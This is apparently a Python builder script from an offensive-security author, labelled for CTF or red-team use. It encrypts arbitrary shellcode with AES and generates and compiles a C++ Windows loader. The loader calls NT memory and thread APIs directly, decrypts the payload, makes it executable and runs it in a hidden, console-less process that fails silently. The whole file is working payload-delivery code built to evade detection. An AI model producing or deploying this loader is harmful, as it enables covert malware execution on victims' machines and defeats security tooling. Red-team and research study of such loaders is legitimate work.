#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.14"
# dependencies = [
#     "pycryptodome>=3.23.0",
# ]
# ///

# Author : PaiN05
# Shellcode Runner For CTF or some Red Teaming Engagements
# Updated: GUI Version - No Console Window

import argparse
import subprocess
import os
import hashlib
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


CPP_FILE = "aes_nt_runner.cpp"
INC_FILE = "meow.inc"
EXE_FILE = "runner.exe"  # Final Output File Name

# KEY DERIVATION
def derive_key_iv(password: str):
    digest = hashlib.sha256(password.encode()).digest()
    return digest[:16], digest[16:32]

# C++ TEMPLATE - GUI Version (WinMain instead of main)
CPP_TEMPLATE = r'''
#include <windows.h>
#include <wincrypt.h>
#include <iostream>

#pragma comment(lib, "advapi32.lib")

// NT Function typedefs
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#include "meow.inc"

unsigned char aes_key[16] = {
    {AES_KEY}
};

bool AESDecrypt(
    unsigned char* encrypted,
    DWORD encLen,
    unsigned char* key,
    unsigned char* iv,
    unsigned char** output,
    DWORD* outLen)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    // Use HeapAlloc instead of new to avoid CRT dependencies
    *output = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encLen);
    if (*output == NULL) return false;
    
    memcpy(*output, encrypted, encLen);
    *outLen = encLen;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        HeapFree(GetProcessHeap(), 0, *output);
        return false;
    }

    struct {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE key[16];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_128;
    keyBlob.keyLen = 16;
    memcpy(keyBlob.key, key, 16);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        HeapFree(GetProcessHeap(), 0, *output);
        return false;
    }

    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, *output, outLen)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        HeapFree(GetProcessHeap(), 0, *output);
        return false;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return true;
}

// GUI Entry Point - No console window
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    unsigned char* decrypted = nullptr;
    DWORD decryptedLen = 0;

    if (!AESDecrypt(
        encrypted_shellcode,
        encrypted_shellcode_len,
        aes_key,
        aes_iv,
        &decrypted,
        &decryptedLen)) {
        return -1;  // Silent fail
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        HeapFree(GetProcessHeap(), 0, decrypted);
        return -1;
    }

    auto NtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)GetProcAddress(
            ntdll, "NtAllocateVirtualMemory");

    auto NtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)GetProcAddress(
            ntdll, "NtProtectVirtualMemory");

    auto NtCreateThreadEx =
        (NtCreateThreadEx_t)GetProcAddress(
            ntdll, "NtCreateThreadEx");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
        HeapFree(GetProcessHeap(), 0, decrypted);
        return -1;
    }

    PVOID base = nullptr;
    SIZE_T size = decryptedLen;

    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1,
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (status != 0 || base == nullptr) {
        HeapFree(GetProcessHeap(), 0, decrypted);
        return -1;
    }

    memcpy(base, decrypted, decryptedLen);

    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        (HANDLE)-1,
        &base,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (status != 0) {
        VirtualFree(base, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return -1;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,
        base,
        NULL,
        FALSE,
        0, 0, 0, NULL);

    if (status != 0 || hThread == NULL) {
        VirtualFree(base, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return -1;
    }

    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFree(base, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, decrypted);

    return 0;  // Silent exit
}
'''

# ENCRYPT + INC 
def encrypt_shellcode(shellcode_path, password):
    key, iv = derive_key_iv(password)

    with open(shellcode_path, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))

    with open(INC_FILE, "w") as f:
        f.write("unsigned char encrypted_shellcode[] = {\n")
        for i in range(0, len(encrypted), 12):  # 12 bytes per line for readability
            chunk = encrypted[i:i+12]
            hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
            f.write(f"    {hex_bytes},\n")
        f.write("};\n")
        f.write(f"unsigned int encrypted_shellcode_len = {len(encrypted)};\n\n")

        f.write("unsigned char aes_iv[] = {\n    ")
        f.write(", ".join(f"0x{b:02x}" for b in iv))
        f.write("\n};\n")

    return key

# WRITE CPP 
def write_cpp(key_bytes):
    key_str = ", ".join(f"0x{b:02x}" for b in key_bytes)
    cpp_code = CPP_TEMPLATE.replace("{AES_KEY}", key_str)

    with open(CPP_FILE, "w") as f:
        f.write(cpp_code)

# COMPILE as Windows GUI application
def compile_exe(output_name):
    # Try different compilation methods for GUI app
    compile_commands = [
        # Method 1: MinGW-w64 64-bit with GUI subsystem
        {
            "cmd": ["x86_64-w64-mingw32-g++", CPP_FILE, "-o", output_name],
            "flags": ["-static", "-ladvapi32", "-mwindows", "-s", "-Os", "-fno-ident", "-ffunction-sections", "-fdata-sections", "-Wl,--gc-sections"],
            "desc": "MinGW-w64 64-bit (GUI)"
        },
        # Method 2: MinGW-w64 32-bit with GUI subsystem
        {
            "cmd": ["i686-w64-mingw32-g++", CPP_FILE, "-o", output_name],
            "flags": ["-static", "-ladvapi32", "-mwindows", "-s", "-Os", "-fno-ident"],
            "desc": "MinGW-w64 32-bit (GUI)"
        },
        # Method 3: Alternative MinGW with explicit subsystem
        {
            "cmd": ["g++", CPP_FILE, "-o", output_name],
            "flags": ["-static", "-ladvapi32", "-mwindows", "-s", "-Os", "-Wl,--subsystem,windows"],
            "desc": "MinGW (GUI with explicit subsystem)"
        }
    ]
    
    for comp in compile_commands:
        try:
            full_cmd = comp["cmd"] + comp["flags"]
            print(f"[*] Trying: {comp['desc']}")
            print(f"[*] Command: {' '.join(full_cmd)}")
            
            result = subprocess.run(full_cmd, check=True, capture_output=True, text=True)
            print(f"[+] Compilation successful with {comp['desc']}")
            
            # Verify the output file exists and has size > 0
            if os.path.exists(output_name) and os.path.getsize(output_name) > 0:
                return True
            else:
                print(f"[-] Output file {output_name} not found or empty")
                
        except subprocess.CalledProcessError as e:
            print(f"[-] Compilation failed: {e}")
            if e.stderr:
                print(f"[-] Error: {e.stderr}")
            continue
        except FileNotFoundError:
            print(f"[-] Compiler not found: {comp['cmd'][0]}")
            continue
    
    return False

# Check for required tools
def check_dependencies():
    # Check if Python Crypto library is installed
    try:
        import Crypto
    except ImportError:
        print("[-] PyCryptodome is not installed!")
        print("[*] Install it with: pip install pycryptodome")
        return False
    
    # Check if MinGW is available (optional, only for compilation)
    try:
        subprocess.run(["x86_64-w64-mingw32-g++", "--version"], 
                      capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Warning: MinGW-w64 not found in PATH")
        print("[!] You can still generate the C++ file, but compilation may fail")
        print("[!] Install MinGW-w64 for cross-compilation")
    
    return True

# MAIN
def main():
    parser = argparse.ArgumentParser(description="AES-encrypted shellcode runner (GUI - No Console)")
    parser.add_argument("shellcode", help="shellcode.bin file path")
    parser.add_argument("--aes", required=True, help="AES password for encryption")
    parser.add_argument("--compile", action="store_true", help="Compile the executable")
    parser.add_argument("--output", "-o", default="runner.exe", help="Output executable name")
    parser.add_argument("--keep", action="store_true", help="Keep intermediate files")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    args = parser.parse_args()

    # Set global EXE_FILE
    global EXE_FILE
    EXE_FILE = args.output
    
    # Check dependencies
    if args.compile and not check_dependencies():
        if args.verbose:
            print("[!] Continuing anyway...")
    
    # Check if shellcode file exists
    if not os.path.exists(args.shellcode):
        print(f"[-] Shellcode file not found: {args.shellcode}")
        sys.exit(1)
    
    # Check shellcode size
    shellcode_size = os.path.getsize(args.shellcode)
    print(f"[*] Shellcode size: {shellcode_size} bytes")
    
    if shellcode_size == 0:
        print("[-] Shellcode file is empty!")
        sys.exit(1)

    print(f"[*] Encrypting shellcode with AES-128-CBC...")
    key = encrypt_shellcode(args.shellcode, args.aes)
    
    print(f"[*] Generating C++ file with embedded encrypted shellcode...")
    write_cpp(key)
    
    print(f"[+] Generated: {CPP_FILE}")
    print(f"[+] Generated: {INC_FILE}")

    if args.compile:
        print(f"[*] Compiling as GUI application (no console window)...")
        if compile_exe(args.output):
            # Try to verify it's a GUI app
            try:
                # Simple check for GUI subsystem using 'file' command on Linux/macOS
                result = subprocess.run(["file", args.output], capture_output=True, text=True)
                if "PE32" in result.stdout:
                    print(f"[+] Build successful: {args.output}")
                else:
                    print(f"[+] Build complete: {args.output}")
            except:
                print(f"[+] Build complete: {args.output}")
            
            # Clean up intermediate files
            if not args.keep:
                if os.path.exists(INC_FILE):
                    os.remove(INC_FILE)
                    print(f"[+] Removed {INC_FILE}")
                if args.verbose and os.path.exists(CPP_FILE):
                    # Optionally keep CPP file for debugging
                    pass
        else:
            print("[-] Compilation failed!")
            print("[*] Make sure MinGW-w64 is installed:")
            print("    sudo apt-get install gcc-mingw-w64-x86-64  # On Debian/Ubuntu")
            print("    sudo apt-get install gcc-mingw-w64-i686   # For 32-bit")
            sys.exit(1)
    else:
        print(f"[*] Run with --compile to build the executable")
        print(f"[*] Example: {sys.argv[0]} {args.shellcode} --aes \"{args.aes}\" --compile")

if __name__ == "__main__":
    main()